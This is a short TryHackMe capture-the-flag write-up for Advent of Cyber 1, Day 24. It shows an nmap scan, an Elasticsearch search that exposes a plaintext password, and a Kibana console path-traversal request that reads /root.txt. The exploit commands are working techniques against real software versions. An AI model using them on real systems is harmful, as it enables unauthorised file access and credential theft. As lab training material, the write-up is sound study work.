# TryHackMe [Advent of Cyber 1](https://tryhackme.com/room/25daysofchristmas) Day 24
## Reconnaissance
```bash
$ nmap -sV -p- -vv 10.10.46.92 
PORT     STATE SERVICE   REASON  VERSION
22/tcp   open  ssh       syn-ack OpenSSH 7.4 (protocol 2.0)
111/tcp  open  rpcbind   syn-ack 2-4 (RPC #100000)
5601/tcp open  esmagent? syn-ack
8000/tcp open  http      syn-ack SimpleHTTPServer 0.6 (Python 3.7.4)
9200/tcp open  http      syn-ack Elasticsearch REST API 6.4.2 (name: sn6hfBl; cluster: elasticsearch; Lucene 7.4.0)
9300/tcp open  vrace?    syn-ack
```
## Find the password in the database
```json
$ curl -s '10.10.46.92:9200/_search?q=password' | python -m json.tool
{
    "took": 16,
    "timed_out": false,
    "_shards": {
        "total": 6,
        "successful": 6,
        "skipped": 0,
        "failed": 0
    },
    "hits": {
        "total": 1,
        "max_score": 2.0136302,
        "hits": [
            {
                "_index": "messages",
                "_type": "_doc",
                "_id": "73",
                "_score": 2.0136302,
                "_source": {
                    "sender": "mary",
                    "receiver": "wendy",
                    "message": "hey, can you access my dev account for me. My username is l33tperson and my password is 9Qs58Ol3AXkMWLxiEyUyyf"
                }
            }
        ]
    }
}
```

**Answer**: `9Qs58Ol3AXkMWLxiEyUyyf`
## Read the contents of the `/root.txt` file
curl -s '10.10.46.92:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../root.txt'
curl -s '10.10.46.92:8000/kibana-log.txt' | grep "ReferenceError"